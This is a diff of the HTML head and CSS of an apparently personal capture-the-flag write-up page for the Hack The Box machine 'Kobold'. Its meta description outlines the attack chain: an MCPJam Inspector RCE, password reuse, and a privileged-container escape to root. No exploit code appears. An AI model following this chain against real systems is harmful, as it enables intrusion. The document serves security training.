@@ -3,118 +3,331 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="description" content="Hack The Box: Kobold — rooted by db-d2 (active box, write-up locked until retirement).">
-<link rel="icon" href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA2NCA2NCI+PHJlY3Qgd2lkdGg9IjY0IiBoZWlnaHQ9IjY0IiByeD0iMTQiIGZpbGw9IiMxNDFhMjQiLz48aW1hZ2UgaHJlZj0iZGF0YTppbWFnZS9wbmc7YmFzZTY0LGlWQk9SdzBLR2dvQUFBQU5TVWhFVWdBQUFFQUFBQUJBQ0FZQUFBQ3FhWEhlQUFBQUNYQklXWE1BQUE3RUFBQU94QUdWS3c0YkFBQUR4a2xFUVZSNDJ1MmJPMmdVVVJTRy83T0VJQ0dFTlFRSnFVS0tGS2tpaUlLSWpaVVNHeEhSVGhBeHBXaWhpS25TS0dJcFZnSEZRa0hCd2pvR0ZTMVVTRUJRRk9LclVZeVBhRUNOcUovRlhtVWRaK2V4TTdNN0UrZUhhVGJubnNlZnVlZitkKzlkVTRzQWRFamFLR21McEZGSmc1SjYzSjgvU1hvdWFVN1N0S1E3WnZaZEt3RkFIekFKdkNJNlhya3hmVVV1dkFJY0JEN1NQRDQ2SDVXaUZiOEdtQWtwN2dGdzFqMFBRbXhuZ0RWRktYNEltQThvWmduWUNkU1BrZnRzS1dEY1BEQ1U5K0w3UTRvSEdBc1lQeFl5ZGo2M2J3TFFBZHdLS2VCMkJEKzNRM3pjY0N0S0traXp1UnlTdENuRTVub0VQMkUybTEycy9CQUE5RXVhaUdDNm5KTE5oSXVabXpmZ3NLVHVDSFliVXJMcGRqRnpNZmM3Z1hjUjEvVWZ3R2lBcjFGbkV3WHZnTTQ4RUxBdHByaDVCb3o0K0JrQlhuaHNsNEh6d0JsZ3djZlh0andRY0xvSmhiY01YQURHM1hQQmZkYXdRR0RRUjFXZXpnTUJNMlNERno2eExuc1ZZaDZhNEdCRzNQWUNYWjdQQnRLT25RWUIxWXdJNkpZMEJmUzZSbnZNYmFkVGpXMHBUSUVQR1pJZ1NUL2Q0NmYrRnMxc2RSTG5IY28vS2lrcjF0UUoyQ2VwWGV2eE41WElzQWU0cmVkbVNkNnZwdDZhMlJWbnMxZlNxamJsLzlYTXpyazhkdnJsS2VtbW1iMkoyOWdFSEFlK05GaWpaK3ViSU8zRGg3bzhaaHZZZkhHMXhPb0JSeVZOcnBDM2ZKV3I1YnVrRTZFNkFPaUp1TFV0R2laY2JhRkNhS09rcmhWSVFKZVBrUEtkQW1tS21pZVNqcWgyNk5Hc3pENHBhVGlsZktxdEZFSS9KVzAzc3ljSmZNd0JEeVU5eWtvTVpYbmdzSml3K05vNlhmT3htS1hNekFxOXdMb1U5aHJySlBYbVdRb0g0Um93S2VscGsrT0hzbDZSc2lhZ1g5S1p2TyswL211VUJQenZCR1RkQTE0N0haNjBDZllYbFlEdFpuWS80VEo0VjlLOUlrNkI5MG1MZDBMb3ZxVDNSU1NnQ2lUVzhNNUh0WWhUb09LRVVCcWJvVXBSZThDd3BLdmxNbGdTVUJKUUVsQVNVQkpRRWxBU1VCSlFFbEFTVUJKUUJBS2lYSG10UDJSODJjYjhYemJJcVJIQ2F3T21JNTdOcjNmMkE4RGpOdHdOZUF3TXVCeldSeHd6SGZybFE0eTd1bE4xNDFwTndwL2lYZnlwR0hlVmg0TUlPQlVqaWFYNjgvWVdrdUF0dmlma3B6WmVuR3BVZkdlREM4bEJHUGY0eUpxRXY0cDNNY2RqK2xpb3YyVnVkWTUyUzdvWXN3bk5tZGxhTDVISzdvTEZaelA3NW9rM3E5b1BNZU5najVsZGFyYjUrVGJEZGlCRzh3dHVoakdiWDhObTJBWUNwcHJNK1U4ei9LMEQ5aWNRUmJ2OExoKzFvUGdlU2JzUzZKLzlTWnBmWUROc0VRSGpDWE5lQURvcmtuYm8zeHVXY1hHZ0RUTWdhY3crU1RzNkpHMVY4d2NYdjFFRlJzenNZWXYrK3lPcW5SWWx6WHZyTDJnUnBkVUFXVkhtQUFBQUFFbEZUa1N1UW1DQyIgeD0iOSIgeT0iOSIgd2lkdGg9IjQ2IiBoZWlnaHQ9IjQ2Ii8+PC9zdmc+">
-<title>Kobold — HTB · db-d2</title>
+<meta name="description" content="Hack The Box: Kobold — an Easy Linux box themed as a container-operations suite. Foothold is an unauthenticated RCE in MCPJam Inspector (CVE-2026-23744). Root is a chain of small reaches: an operator-writable PrivateBin file gives code execution inside its container, the container config leaks a database password, that password is reused as the Arcane admin credential, and Arcane, running as root over the docker daemon, launches a privileged container that owns the host. Write-up by db-d2.">
+<link rel="icon" href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA2NCA2NCI+PHJlY3Qgd2lkdGg9IjY0IiBoZWlnaHQ9IjY0IiByeD0iMTQiIGZpbGw9IiMwZDEwMTciLz48aW1hZ2UgaHJlZj0iZGF0YTppbWFnZS9wbmc7YmFzZTY0LGlWQk9SdzBLR2dvQUFBQU5TVWhFVWdBQUFHQUFBQUJnQ0FJQUFBQnQrdUJ2QUFBU0tFbEVRVlI0MnUyY2VYQWMxWjNIMysrOTdwNlpucU5uTkpLc1c1YXQwNGRrR3h2akF6Q25NYkpzQ3hzQ3d0NXNRdGl3VktwUzJjMG1sYTBRSUtuOHNjdHVzc1Z1SlJTcENzVm1vWklOdFJ3aElRY2toQnVjaEhCWWxvd01OcFl2MlpJc1RjLzBkUGQ3NzdkL3RDeGtXYWRuTkJJdWRla2ZlM3A2M3Z2MDkzZTgzenNnSEYxQWNuZ0JaU2c0ZDVJQTFCOHJDeGN2RFJjdjFlTUx0WENoNGc5VHBoRkNwSEJGT21HYlBhblRINW5IMnhQSDkxbG51bEVLUlFzQ1UxQktRakIzRGM0WklBQ0tLTGx0cWdFalZyVXVYcnNwWEx4VTFXTkFLVXFKVWlBS2d1amRDa0NCS3Q1SGJxcmZQTEgvOUlFLzlILzR1bXVkVVh4QkFJWW9MeVpBQUpUeWRJSnBldUd5NXVLbVZqMi9DaEVsVDZQZ1NCQUllUGNoUVVMSXlIOENJY0JVcXZnQklOVjc2TVE3VC9XOC95eTNrNG8vbkJzcHpUd2dvQVFsdDgyOHhSc3FOMzR4VkZRdjNiUncwd1FBQUFnQlFnaEtBWlFDMHlobGhCQXBCUW9IcFFUS1BGQ0lTQkNaNnFlcTN6eDU0T05YSHU3dGVpazNVcHBaUUVDWmROT0Uwc3FOZHhXdnVwbWdGRTRLZ0JJWTBnaEJTWUFxdnBBVWpwMDQ0Wmg5aEJBdGxPY0xGMUdtY2R2MGJqaDdNeUpLcGdVQTJQRy8vdC9obDM4b0JXZXFINlg0VkFJQ3lvU1RVb041dFRmZUc2MjgxTFg2UFdNYnZnRlJNc1dIS0h2YW56djJweWVUSjd0UXVvUVFvR3B3UVhYSjZ0YkNKVnNBcU9EMnFHOFJRdFJBZE9ESVh3Nzg4ajRuY1lyNWdqUEhhS1lBQVdYQ1NmcU4wb2JXZnduRUYzSnJBS2d5OGdaRXlkU0FrempaK2V6OWZRZGZMN2wwWThWVjE0WEtGeEpDRWg4Zit2akYzeDU3NjlYNDRuVjFXKy9Wd2d1RWE0MWtSQWhCeVJXL1lmVi92UC9KcjZmN2o4d2NveGtCQkVBRlQvdENCVXQzZmQ4ZkxlTjJZaFFkZ2doTTVla3o3engydDNCNk45ejNRUEUxMXpGVlZSR1JFR0JNdXU3aDMvM20xZnYrU2RIaWpiZi9RUEZIVWJpZkdPWXdJMThvUFhoaTM4Ky9ZZytlWUtwL0p2d1I4L2xEV2NlRFVqREYxOUQ2cjNyQjRqSG9lRCtzK2pxZnZTOTF1dlA2SC8yMGJOT21FdUg0WGFmWFRLTHJDTXVTcmx2UXRMSm85ZnJPSng1Sm5UNWN1SFF6Q2o0S0VBQ1ZQSzJGOG8yeUZiMmRMMGp1bkhYcWN4c1FBQldPVmIzNUczbUwxNTl2V1o1eEtiNVEvK0UzRHo3L0grdisrYnNWTjJ6WndNU1dpcUttUE1PU2VNU3lWWVVSQUhkd01GWlRxK3FSL1Q5L0tMcHdsWjYvU0hJYnptZmtXb0ZZdWQ4b1B0WHhQR1ZhMWdNL3picnJjZE9EUlUwN0NwZmU0S2JPaktrZGdnaVU5cno3bkZGUlZibGxxeTlwTnVYSGtsd0l4Sld4aUFMZ1pZdFVWZE5uK2hjMWJ6UEtGL2E4K3h4UU9wUkdqdjVGeFUyZHlhKy9ybmpsTHA0ZXlMcUlhSGJGSTkxMElGWlJzZUVPWVNkSHVkVnovTGRyRFhidksxeTVXbzlGemJUZFk3c1JWUWt3ZXRSS2M4UWhsUUFnNTc1b3RIRGxtc0h1ZmNLMXh1czhVTXB0czJMZDUvWDRJaS9EbXFPQUFLamtUdm02ejJyQnVEelBwdzdyeDdNTDEwb0VGNVFBVUk3NFRIZlBhNmZPdkhDaTcvY24raFNnSTRVQ0FNR2lFdGRLeUtGQU5xWUZBUXBYMWFQbDYvNFdoUU56RkJCUTRhVENwY3Z5NjY3bGRtSmlxUU5sbENrOGJTRWhLc0NneTM5OTdQU0xKL3M0SWoyM2QwZ0lUMXVVS1pNK2tLY1Q4ZHFySW1VcnVKMGFUN3l6Q1FnQVVQQ2lwbGFtK2xGT0VHNEJwV0JheUI4cjZUK3dYem9PQWlnQXVrSjFoY0w1TnVzNC9RZjIrMk1sVEF1aEZJU01xdzVFU1JXdGFFVXJRVEgzRk9SNW4zaGwzcUlOM0VsTy9MWVJKVkFsdjI3anliZjM5aDg0b09xNkZFSWlrZWRhRHdxaDZuci9nUU1uMzk2Ylg3Y1JxT0tsT1lnU3BTQ0lLTVhJeE1kTDNHTlZsK241aXdUUG1pZWkyZkkrd2szbkxkNm9CbU1vK0ZUeWdNSmxXNWdTL3ZPRER3QlRRRkVrNTU4RUtVVEpPU2dLTU9YUER6N0FsSERoc2kzQ3NZQlNSS2xxQVY4d1NsVy9MeGhWdGNCSVJpaTRHb2ptTGI1Y3VuYTJyQ3g3ZVJDUWl2VmY4SVVYU09sTzRpWUJVTGhxTU82THhELzQxVVBwM29HS3E2NVJkUjJGSUZJU1FvQXhMUlFHb0s5LzU5NnVYL3h2L2JaN0l1V3JoR3NSUWpSL3FMZTdZLy92SCs3ZDkzVDNnYjFxTUI2Smw0a1IrUkZRUmhYdGRNY0xaQTRCQWtEdStJM1M4clY3UmhaM0pvdDNkcmg0bWVvUGRqNzFYOGZmZUQwUUx3emtGNmk2VGhYRlRWbkgzM3o5bFc5KzlhUGZQVk96K2F2RksyL210a2tJMGZ6Qjd2MnZwRi81NW5kdk1MKzBpYTNPNjM3aHVhZE10VHhXVXVzeEFnQkVvZnFOdm9NdnU2aytZRXJtZ0pSc1NBZUVjSUtGTlVyQTRMWTVSVzBEVUdFbnk5WitWbzlYSHZ6ZGc3KzlhMCtvcERSVVhFSUlNWThmTTQ4ZERSWXNibXI3ejd6cVRjSTJBUUNBcHBPRC9XLzk0TmRmWHJSOGFiR2JzQzl0TEZsUmRXTHo5MzRRcjJ4U3RRQ2k4Q0tBNG84RUMydFRwN3BBOWY1enRnRVJBSlF5V0ZBTmxCRkVBdFA0SXJjVGVkVlhHaFdyenh6ZTIvL1IzblRmTVVKSXRHSlQxWlZyb3BWcm1CYmtkc0tyMVdvK2YvZkI5elpVV010cmF2cFBtUXFqNWlsemVVMyt4c3J1ZHc3dlg3UjB2WjAyQVlBZ0F0QmdZWFhQKzlrWmMyUURFQ0pRSlJBclJ5bW1HenNBS0xkTm9DeGVjMVYrM2JWREVSb1lTaUhjMUxsNmhER3lSQnp4NGZEYlFoR0lsUU5UeHh5YXpBSWdSRWxWVFFzWG9CUndJZnJ6YXJJSmdqakVGOUVyeUE3VEFRRFhTUmRWMUwzeXB2KzlydDdsUzRyY2hLM21CZDVyNzNuNWtGYTdwdDUxMHA2ZkJrSlFDaTJZejFSZlZxb2ZtVHRwSUloVTBZb2FkekJOUjhFSlFZTFQveHNML01nL0tia3ZFSGFWK0UrZmVOS2dLUzc1QzN1UGZ1bkhoNEpydmh3dmErQ085Y2xYZ0tCd1RyWC9SZ28zODJDZkhRVXh4YWVGQzlTQWdlTU93YkpoeWxKV3JkNXhxbkRSMTk1NFNuMnAxMVhySzI3Y1hyaHdoWk0ydFdEZWlGS2NRcEJReFMrY0ZJRk1CL2VaVnhRQlVURFZYOVMwZzZwK2dwS1FtUUdFaEFCQktWU2ZUcG5LWFVkUk5TbGMxN2FBVXUvVHMvZFJ5WjBUN3o0bG5CUUF5N0JDbEtXU0t5SjNrbGx4aWxNUkVucERQMFFnWk95RUVFRFJnbG5Sc3BLZFJnT29BWVBNcFN0Yk5YeGxyalZvcmwxVEFrUXBQVit1S0NXT3NDbkdHTXlZZTc2QWkzTStzaFFEbEk0UlhLVE1HQkFBUVV3bFRUbTZGb09hejY5cVBxLzBnNGhuK3ZwbTBFTlAzNStIREdNb002TFVkV3pIVG85cVA2WE1IOUE5WDNhaGdBQlFDaW5sNnZXYlNzb3JoeDhFQUk1dHYvdm5OMDRjL2RnZjBEbm51cTdmZmZmZEFUMGdwWVRaWmtNcFRhZlRqL3o0RWRNMFZWVk5XNmtGSmVWTmwxeW0rZjBqdWtDUGR4OStaKzlyQklBeE5nR2ppYU1ZQ01ILzVvdGYyWGpOalZLSWtTOEFBQktEQXc5Ly96c2Q3NzFObVJxUDU3M3o3anV4c0cvV0pZU0VVRUlTbG1ocWJEcHg4aVFLVWJOaytWMy8rSzJJRVJ0RmdWTDIyb3UvZWZTSC8wNHB2UkFGVVVwVFNYUDErazBicjlreWNLYjNuQ0lHRUNsa0tHSzAzbmJIQXgzL0lJUkFnbjE5ZllUa3VhNDd1NTRJRVJWRkdSZ1lHRm9Rb3JEVzJ6NGZDaHNEL1gyVTBaRXBFUkxjY05YbWQvL3k1aHN2UFI4TWhzYnpSOHBFVlZRcFM4c1hDaUdBQUdWczFBREtUbHZSdkhqRWlKNCsxUU1FR0dPS29pRGlYQUNrS0FvaFJBaHVSQXRpOFlKMDJtS0tNcXBoVWdqT2VXbDVKVW81UWNha1RQcDc0M1VZQUthYkZ3b2hNT05rRWdBWVk5TkNObEVYSm11UGtyTVhTd2hFbzdxU1dlWVBoQWhDQmhOMnpxU3E1SVlPWTVSUitzVFBuMjdmMXc3MHdqc21wV3hvYUdocDJZcUVjQzV5d0NnbkNnSmdsTnoxOTNjLzl1Z2pCSlRNaG14QWlQdVp0ajBQLytpaGkwUkJRb2lvb1QveHhOT1BQZnBJcktDSVpNTUgvZXp4bnpRM043ZmR0cXQvSURVdGZ6UVhBU0VpQTlMZTNnNmdFTVNSSTRBTGJMR2lBS2o3MnRzcEVKejUrZ0VsODllcyt5QWdKS0RyaUpJeEprU21nMzdHR0tMVUEzcHUwcTBaVnhDbE5PV0k1aHUzUk9QNXAwK2ZGa0x3REM0aFJHOXZiemdhMjdxMU9lWElpVWNKbnc0RlVVb3R5Nm12cjMzODhmKzU1NTV2SFR0MmZDcnAyUVI1WFYxdDdmM2Z2bS9ac29hRWFWME1nRHhHQ2RPNitwcXJObXo4UTA5UFQ0WlBLeWdvQ0FUVVJDSVhkSEtYU1ZOS0V3bUxNVnBVVkpUaG8xelhIUnkwR010UmVNa1JJRUtJMXlYSGNiSXhGc3RkOEowUDgzTkdRVkpLQUZCVk5YTVRreEl2TmhPVFVvWkNBZGVWcDArZk9sdDBuRzRnRy9wV1BKNnZhY3cwTHlJbjdkRjU2WTh2Zit1ZWU0OGVQVW9BY0dqcjNQVDRBQUZDc0xpNCtQNzc3N3Y2NmswWFNaaVhVdnI5MmdjSHVtNjl0YTJ2dDFjUEJqTVpRQUhBa1NQZHQ5N2E5dUlmLzFCYlcyMVp6a3d6b2prQXBQdllzNy84VmQrcG52eUNBa1ZSMUF3dVJWSHk4L01IK25wLzhjeXp1c2FtTXJIMTZmQkJxV1FTZ0dhbDVDcUVBS0RKVkRJM081L253L3hzS3dnQUJKTDYrbnBFRndDOCtZYU1Ia2dwb2x0Zlh5OEp1UmhLcm95eGhHbTN0RFIvcG0zUHp4Ny9DWUhNbGc0Q0VIUjIzdExXMnJwdE1HSFBkRG1SNUt4b2owZ2YvdEhEemMzTjdlMzdBT2dGTWdKQWxQWDFEYTJ0Tzd6Rm1oZEowUjRBdUJBQTBOYTJpNUZkV1pyMmtSZlB0QTg1Nnl6Nno2U3lOWEdZcy9uYjNJM0ZQSC8wcVl0aTgyRitIdEE4b0hsQTg0RG1BYzBEbWdjMEQyaittZ2MwRDJnZTBLY1lFQ0xPblY1bHNURlpBT1J0ajFCVk5RZHpERk81cEpTS3FsSktzNElwQzRBVVJoT0RneWRQbmd3RzFjd1hrR1Y0Q1NHQ1FlMVVUOC9nd0lDaUtKa2ptZ1RRcEhVcFJHU01KVk9wUGJmZmZyRHJVQ1FTNUh6V0dISE93K0hnNFVOSGRyZTFKUklKaFNtVGltalNEazRNQ0thaUNDbFIxL1hPQXg5czM5WjYrTkNoU0VTZkZVYWNpM0E0ZUxUN3lQWnRyZTN0Ky9WZ1VKN2R5emF4NGk0UUVCQ0NLSVBoOElTdWgxSEdDS0lRd2pDTXJxNnVscGJXUTBPTWVNN3A2TjFIdXJlMXRIWjBkaHJScURkSnlSU21xT1BPb3lCaU1CUVoyaHc4TFVCQWFkcEtWVlhYcjkrMDJVb2w2WGxyVFFCQWNCNk9HS1hsVmE3ckFBRG5QR0lZQjd1NnRyZDRPZ3Jtak5FUW5lN3U3ZHQyZEhSMEdvYkJPUWVnam1QWE5DdzNvbm1jOC9OTmlUS1d0bEtYWFhGdGRkMVNLNVVhYjQ2Zmp1ZGFDQ0U3ZDkrcEIwTkNqSE13RmlKanJIWkpvenk3bmNoajVPa29aNHc0RjVHd2ZyUzdlM3ZMam82T1RpTnFlRCtLQkNsbGwxeDJ4Y1QyRmREMW5idnZuQ0RralFHSU1aWTBFNWRmMjd4czVacVVtUmdQTFZEZ3JydTRib2svb011emxqeXNvMjFEdGphempJYTFzNjFsUjBkSHh6QWRBSEFkdTZpMHZMcCttWjBlZDVVTXBUUmxtZzJOcTY3YzNKSTBCOGVjVXhqRGRtemJYbEJjMW5Mem5yU1ZndkVYbHdCUXgzV0tTaXNLaTBvOEt4dkpxR3VJMGVGSUpPZzRUb2JMbzhkY01PMDRUaVNzSCswKzB0S3l3L003d3k4REtIVnN1M0hWMm5ERUVCTWVHZVk1aythZHR4ZVhWZHAyK254TFZNNEg1THJPanRzK1o4VGl5Y1FnblhDaVJnb2VERVdxYWhvK1BuVFE1L3ZrTktOaFJ0dGJkano5ekpOMTFRdXp2cGZWMjV2YTlkR1I3ZHRhT3p1SC9NNG5uMHJwOC9sWFhMcGhUTzh6cXIrY3V4RWoxdHAyeDBQLzltMU44NDJ5TldXVTMwb21CdGVzMzNUcHhxdVRab0pPYlJxcmRzbnlsNTcvNWFnbGRaeHp3ekErK09DRG0yNjZlYytlMjEzdW5aeVROVXFJcUduc3NjZCt1citqSXpwQ081NjBiZHVxcXE2dlhGVGpwTk9USGdCREtVdWFnNnN2dTJMdDVWZS8vdEx6b1hCRWpvajl5amtzWFRjU2piVzIzY0dudGpjWGdMcU9zM0J4ZlRoc2pMU3lUOUkydy9qd3d3Ky84Yld2ejh4bWFQVHB3VkhhR1hhT0s5WnM4UGtENXVEQVZGNno1eTUyM1BxNWp2Zi9hcVZNTmlMRFZNNnhSak94Yy9lZFJhWGxpY0VCTnFYbmd1czYrWVZGSmVVTHV6cmU4d1gwVVVkTVNpRTBUUXNFQ21adTJIVitwaWM0RDRXTnhrdldPbzROZElvSHFvRnIyNFhGcFMwMzcvbnZoNzRYaWhoNDlySEtzRCsza3VhU3BrdXV2RzVyMGt4TWZZNFlwZFI4dnVyNnBSM3Z2KzBmYTVzdlptT1AyRFNHVHBTbWtzbkdTOVlXbFZiWUV3YVo4OU9pcEptNC9Kb2IzMzdyMVgxLy9kTndJazZIWDRYbTgrL2NmYWQzVHRvMFdnUWdoS2hwV0s2b0tzNkowVHdneWxWckwyZU1UWHNsTFNJUzNMbjdDd0ZkSHhZbUhVNThybS9adGJoMmlUVWQ2c01aUjFubG9saGVBZWV6ZktvQUFIRHU1T1VYTmpTdXN1MzBkTS9uQWtyVGxsVzV1Rzd6dGx0U1NkTXpJMHE5VVVWTi9mWGJia2xOeDdoR3RJa2JzWGpGb21yWGNXWWJFTFhUNllibHErSUZDN2g3SVkxaGpLWE14TFV0dTZycmxscFdpcDVOc1dIbjdqdDkvb0M0d0RPQWtERlcyOUFvNVN3ZjNlRU5MMWF0M2VoMTZvSWR2NmI1ZHU3NU93b1VFV2xpY0dERDFUY3NYM21wbFRUcEJaMTNEa0M1Nnk2cVcrSVBCT1RzSGJQa1JhS2kwckxxaHVVVERDK200dWF0cExta2NkVVYxelVuQmdkb1dXWFYxc2xHRlpPMnpIR2M0dEtLQmNWbHJqdHJWZ2FVT283ZHRIcGRPR0tJek9JbVVHcWxVamZlZEh0RlZUVzlxZTBMMFZnOHcxTmJwT1I2TUxTd3VwNjdiaFpQQTUrZWZVbnA4d2NhTDFrMzZmQmlhbzdWalJqUm5idnYvSC8zd2QweDNRZHBjUUFBQUFCSlJVNUVya0pnZ2c9PSIgeD0iNiIgeT0iNiIgd2lkdGg9IjUyIiBoZWlnaHQ9IjUyIi8+PC9zdmc+">
+<title>Kobold — HTB Write-up · db-d2</title>
 <style>
-  :root{
-    --font-mono:ui-monospace,"SF Mono",SFMono-Regular,"JetBrains Mono",Menlo,Consolas,"Liberation Mono",monospace;
-    --font-sans:-apple-system,BlinkMacSystemFont,"Segoe UI",system-ui,"Helvetica Neue",Arial,sans-serif;
-    --bg:#0d1017;--bg-raised:#141a24;--bg-inset:#090c12;--border:#232c3a;--border-soft:#1a2230;
-    --ink:#dfe6f0;--ink-dim:#97a4b8;--ink-faint:#5f6b7e;--accent:#f4a94b;--signal:#63cddb;--crit:#f7546a;--ok:#5fd68a;
-    --shadow:0 1px 0 rgba(255,255,255,.02),0 18px 40px -24px rgba(0,0,0,.8);
+  :root {
+    --font-mono: ui-monospace, "SF Mono", SFMono-Regular, "JetBrains Mono", Menlo, Consolas, "Liberation Mono", monospace;
+    --font-sans: -apple-system, BlinkMacSystemFont, "Segoe UI", system-ui, "Helvetica Neue", Arial, sans-serif;
+    --bg: #0d1017; --bg-raised: #141a24; --bg-inset: #090c12; --term-bg: #090c12; --term-ink: #cdd7e6;
+    --border: #232c3a; --border-soft: #1a2230; --ink: #dfe6f0; --ink-dim: #97a4b8; --ink-faint: #5f6b7e;
+    --accent: #f4a94b; --accent-ink: #1a1204; --signal: #63cddb; --crit: #f7546a; --ok: #5fd68a;
+    --shadow: 0 1px 0 rgba(255,255,255,.02), 0 18px 40px -24px rgba(0,0,0,.8);
   }
-  *{box-sizing:border-box;} html{scroll-behavior:smooth;}
-  @media (prefers-reduced-motion:reduce){html{scroll-behavior:auto;}}
-  body{margin:0;background:var(--bg);color:var(--ink);font-family:var(--font-sans);line-height:1.65;-webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility;}
-  .wrap{max-width:940px;margin:0 auto;padding:0 24px;}
-  a{color:var(--signal);text-decoration:none;border-bottom:1px solid color-mix(in srgb,var(--signal) 35%,transparent);}
-  a:hover{border-bottom-color:var(--signal);}
-  a:focus-visible{outline:2px solid var(--accent);outline-offset:3px;border-radius:2px;}
-  .mono{font-family:var(--font-mono);}
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  @media (prefers-reduced-motion: reduce) { html { scroll-behavior: auto; } }
+  body { margin: 0; background: var(--bg); color: var(--ink); font-family: var(--font-sans); line-height: 1.65; -webkit-font-smoothing: antialiased; text-rendering: optimizeLegibility; }
+  .wrap { max-width: 940px; margin: 0 auto; padding: 0 24px; }
+  a { color: var(--signal); text-decoration: none; border-bottom: 1px solid color-mix(in srgb, var(--signal) 35%, transparent); }
+  a:hover { border-bottom-color: var(--signal); }
+  a:focus-visible { outline: 2px solid var(--accent); outline-offset: 3px; border-radius: 2px; }
+  .mono { font-family: var(--font-mono); }
 
-  header.bar{border-bottom:1px solid var(--border);background:var(--bg-inset);}
-  .bar-inner{display:flex;align-items:center;justify-content:space-between;height:58px;}
-  .brand{display:flex;align-items:center;gap:10px;color:var(--ink);border:none;}
-  .brand img{width:22px;height:auto;display:block;}
-  .brand b{font-family:var(--font-mono);font-weight:700;font-size:1rem;}
-  .bar .tagline{font-family:var(--font-mono);font-size:.76rem;color:var(--ink-faint);}
+  header.bar { border-bottom: 1px solid var(--border); background: var(--bg-inset); }
+  .bar-inner { display: flex; align-items: center; justify-content: space-between; height: 56px; gap: 16px; }
+  .brand { display: flex; align-items: center; gap: 11px; color: var(--ink); border: none; }
+  .brand:hover { border: none; }
+  .brand .mark { width: 30px; height: 30px; border-radius: 50%; overflow: hidden; background: var(--bg); border: 1.5px solid color-mix(in srgb, var(--accent) 32%, var(--border)); box-shadow: var(--shadow); flex: none; }
+  .brand .mark img { width: 100%; height: 100%; display: block; }
+  .brand b { font-family: var(--font-mono); font-weight: 700; font-size: 1rem; letter-spacing: -.01em; }
+  .bar .tagline { font-family: var(--font-mono); font-size: .76rem; color: var(--ink-faint); }
 
-  .hero{border-bottom:1px solid var(--border);background:radial-gradient(120% 90% at 85% -10%,color-mix(in srgb,var(--accent) 12%,transparent),transparent 55%),var(--bg-inset);padding:44px 0 52px;}
-  .hero-inner{display:flex;flex-direction:column;gap:20px;animation:rise .7s cubic-bezier(.2,.7,.2,1) both;}
-  .crumb{font-family:var(--font-mono);font-size:.76rem;color:var(--ink-faint);letter-spacing:.04em;}
-  .crumb a{color:var(--ink-dim);border:none;}.crumb a:hover{color:var(--accent);}
-  .prompt-line{font-family:var(--font-mono);font-size:.82rem;color:var(--ink-dim);}
-  .prompt-line .u{color:var(--accent);}.prompt-line .p{color:var(--signal);}
-  .hero-top{display:flex;align-items:center;gap:20px;}
-  .hero-droid{width:56px;height:auto;flex:none;filter:drop-shadow(0 3px 10px rgba(244,169,75,.22));}
-  h1.title{font-family:var(--font-mono);font-weight:700;font-size:clamp(2.6rem,8vw,4.6rem);line-height:.95;letter-spacing:-.02em;margin:0;}
-  h1.title .cursor{display:inline-block;width:.56ch;height:.9em;margin-left:.12em;background:var(--accent);transform:translateY(.06em);animation:blink 1.1s steps(1) infinite;}
-  .thesis{font-size:clamp(1.02rem,2.3vw,1.25rem);color:var(--ink-dim);max-width:52ch;margin:0;}
-  .thesis strong{color:var(--ink);font-weight:600;}
-  .meta-row{display:flex;flex-wrap:wrap;gap:8px 28px;font-family:var(--font-mono);font-size:.78rem;color:var(--ink-faint);padding-top:2px;}
-  .meta-row b{color:var(--ink-dim);font-weight:500;}
+  .hero { border-bottom: 1px solid var(--border); background: radial-gradient(120% 90% at 85% -10%, color-mix(in srgb, var(--accent) 12%, transparent), transparent 55%), var(--bg-inset); padding: 40px 0 52px; }
+  .hero-inner { display: flex; flex-direction: column; gap: 20px; animation: rise .7s cubic-bezier(.2,.7,.2,1) both; }
+  .crumb { font-size: .76rem; color: var(--ink-faint); letter-spacing: .04em; }
+  .crumb a { color: var(--ink-dim); border: none; }
+  .crumb a:hover { color: var(--accent); }
+  .prompt-line { font-family: var(--font-mono); font-size: .82rem; color: var(--ink-dim); display: flex; align-items: center; gap: 8px; flex-wrap: wrap; margin-top: 6px; }
+  .prompt-line .u { color: var(--accent); } .prompt-line .p { color: var(--signal); }
+  h1.title { font-family: var(--font-mono); font-weight: 700; font-size: clamp(2.9rem, 9vw, 5.4rem); line-height: .95; letter-spacing: -.02em; margin: 0; text-wrap: balance; }
+  h1.title .cursor { display: inline-block; width: .56ch; height: .9em; margin-left: .12em; background: var(--accent); transform: translateY(.06em); animation: blink 1.1s steps(1) infinite; }
+  .thesis { font-size: clamp(1.05rem, 2.4vw, 1.3rem); color: var(--ink-dim); max-width: 58ch; margin: 0; }
+  .thesis strong { color: var(--ink); font-weight: 600; }
+  .meta-row { display: flex; flex-wrap: wrap; gap: 8px 28px; font-family: var(--font-mono); font-size: .78rem; color: var(--ink-faint); padding-top: 6px; }
+  .meta-row b { color: var(--ink-dim); font-weight: 500; }
 
-  section{padding:44px 0;border-bottom:1px solid var(--border-soft);}
-  .sec-head{display:flex;align-items:baseline;gap:16px;margin:0 0 22px;flex-wrap:wrap;}
-  .sec-num{font-family:var(--font-mono);font-weight:700;font-size:1rem;color:var(--accent);flex:none;padding-top:.15em;}
-  h2{font-size:clamp(1.4rem,3.2vw,1.9rem);line-height:1.15;margin:0;letter-spacing:-.01em;}
-  h2 .sub{display:block;font-family:var(--font-mono);font-size:.76rem;letter-spacing:.12em;text-transform:uppercase;color:var(--ink-faint);font-weight:500;margin-top:8px;}
-  p{margin:0 0 16px;max-width:70ch;} .lede{color:var(--ink-dim);}
+  .chain { display: grid; grid-template-columns: 1fr; gap: 14px; margin: 40px 0 8px; }
+  @media (min-width: 720px) { .chain { grid-template-columns: 1fr 1fr 1fr; } }
+  .node { background: var(--bg-raised); border: 1px solid var(--border); border-radius: 12px; padding: 16px 16px 18px; position: relative; box-shadow: var(--shadow); }
+  .node .tier { font-family: var(--font-mono); font-size: .7rem; letter-spacing: .16em; color: var(--ink-faint); text-transform: uppercase; }
+  .node .who { font-family: var(--font-mono); font-size: 1.3rem; font-weight: 700; margin: 6px 0 2px; color: var(--ink); }
+  .node .via { font-size: .82rem; color: var(--ink-dim); }
+  .node.root .who { color: var(--accent); }
